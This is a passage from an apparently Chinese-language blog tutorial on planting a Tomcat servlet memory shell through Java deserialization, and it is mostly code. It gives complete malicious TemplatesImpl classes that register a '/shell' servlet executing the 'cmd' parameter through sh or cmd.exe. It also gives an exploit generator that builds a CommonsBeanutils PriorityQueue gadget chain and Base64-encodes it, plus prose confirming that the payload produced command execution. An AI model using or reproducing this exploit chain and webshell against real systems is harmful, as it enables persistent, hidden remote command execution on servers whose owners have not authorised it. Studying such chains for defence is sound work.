class="title function_">init</span><span class="params">(ServletConfig var1)</span> <span class="keyword">throws</span> ServletException&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.config;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Servlet Info&quot;</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">            isLinux = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">        out.println(output);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFinalStatic</span><span class="params">(Field field)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilTemplatesImpl</span><span class="params">(String abc)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFinalStatic(WRAP_SAME_OBJECT_FIELD);</span><br><span class="line">        setFinalStatic(lastServicedRequestField);</span><br><span class="line">        setFinalStatic(lastServicedResponseField);</span><br><span class="line"></span><br><span class="line">        ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(<span class="literal">null</span>);</span><br><span class="line">        ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="literal">null</span>) || lastServicedRequest == <span class="literal">null</span> || lastServicedResponse == <span class="literal">null</span>)&#123;</span><br><span class="line">            WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">            lastServicedRequestField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">            lastServicedResponseField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            AddMemoryShell(lastServicedRequest, lastServicedResponse);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">AddMemoryShell</span><span class="params">(ThreadLocal&lt;ServletRequest&gt; lastServicedRequest, ThreadLocal&lt;ServletResponse&gt; lastServicedResponse)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> lastServicedRequest.get();</span><br><span class="line">        <span class="type">ServletResponse</span> <span class="variable">servletResponse</span> <span class="operator">=</span> lastServicedResponse.get();</span><br><span class="line"></span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> servletRequest.getServletContext();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获得StandardContext后按照分析的步骤做就行了</span></span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">EvilWrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">        <span class="comment">//（重点）此处不利用无参构造方法获得EvilTemplatesImpl对象是避免循环执行无参构造方法中的代码！</span></span><br><span class="line">        <span class="type">Servlet</span> <span class="variable">evilTemplates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilTemplatesImpl</span>(<span class="string">&quot;rainb0w&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> evilTemplates.getClass().getSimpleName();</span><br><span class="line">        EvilWrapper.setName(ClassName);</span><br><span class="line">        EvilWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">        EvilWrapper.setServlet(evilTemplates);</span><br><span class="line">        EvilWrapper.setServletClass(evilTemplates.getClass().getName());</span><br><span class="line"></span><br><span class="line">        standardContext.addChild(EvilWrapper);</span><br><span class="line">        standardContext.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>, ClassName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里无法直接new一个Servlet对象，具体原因未知（后续反序列化注入Tomcat-Filter型内存马时同样无法直接创建一个Filter对象）。因此采用办法的是让EvilTemplatesImpl实现Servlet接口，接着重写接口中的方法，将接受参数执行命令并回显的部分写入service方法中，最后我们直接创建一个EvilTemplatesImpl对象即是一个Servlet对象。<strong>但是切记不要使用无参构造方法创建，因为反序列化时我们无参构造方法中的代码是默认执行的，如果这里创建对象时还用无参构造方法，那么就会造成递归。</strong>实际效果如下：</p><p>首先将生成的payload进行url编码发送：</p><p><a href="https://pic.imgdb.cn/item/64d26d701ddac507cc03df1c.jpg" title="image-20230803115541939" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26d701ddac507cc03df1c.jpg" alt="image-20230803115541939"></a></p><p>接着进入&#x2F;shell即可执行命令：</p><p><a href="https://pic.imgdb.cn/item/64d26d821ddac507cc040f4a.jpg" title="image-20230803115508565" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26d821ddac507cc040f4a.jpg" alt="image-20230803115508565"></a></p><p>以下是第二种方法的EXP：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(EvilTemplatesImpl1.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@org</span>.junit.jupiter.api.Test</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">payload</span> <span class="operator">=</span> getpayload();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        outputStream.writeObject(payload);</span><br><span class="line">        outputStream.flush();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">codes</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">        System.out.println(codes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>恶意模板类如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Wrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilTemplatesImpl1</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> ServletConfig config;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig var1)</span> <span class="keyword">throws</span> ServletException&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.config;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Servlet Info&quot;</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">            isLinux = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">        out.println(output);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> HashSet&lt;Object&gt; h;</span><br><span class="line">    <span class="keyword">static</span> HttpServletRequest r;</span><br><span class="line">    <span class="keyword">static</span> HttpServletResponse p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilTemplatesImpl1</span><span class="params">()</span>&#123;</span><br><span class="line">        r = <span class="literal">null</span>;</span><br><span class="line">        p = <span class="literal">null</span>;</span><br><span class="line">        h =<span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Object&gt;();</span><br><span class="line">        F(Thread.currentThread(),<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilTemplatesImpl1</span><span class="params">(String s)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">i</span><span class="params">(Object obj)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(obj==<span class="literal">null</span>|| h.contains(obj))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        h.add(obj);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">p</span><span class="params">(Object o, <span class="type">int</span> depth)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(depth &gt; <span class="number">52</span>||(r !=<span class="literal">null</span>&amp;&amp; p !=<span class="literal">null</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!i(o))&#123;</span><br><span class="line">            <span class="keyword">if</span>(r ==<span class="literal">null</span>&amp;&amp;HttpServletRequest.class.isAssignableFrom(o.getClass()))&#123;</span><br><span class="line">                r = (HttpServletRequest)o;</span><br><span class="line">                <span class="keyword">if</span>(r.getHeader(<span class="string">&quot;rainb0w&quot;</span>)==<span class="literal">null</span>) &#123;</span><br><span class="line">                    r = <span class="literal">null</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        p = (HttpServletResponse) r.getClass().getMethod(<span class="string">&quot;getResponse&quot;</span>).invoke(r);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        r = <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(r !=<span class="literal">null</span>&amp;&amp; p !=<span class="literal">null</span>)&#123;</span><br><span class="line"></span><br><span class="line">                AddMemoryShell(r,p);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            F(o,depth+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">F</span><span class="params">(Object start, <span class="type">int</span> depth)</span>&#123;</span><br><span class="line"></span><br><span 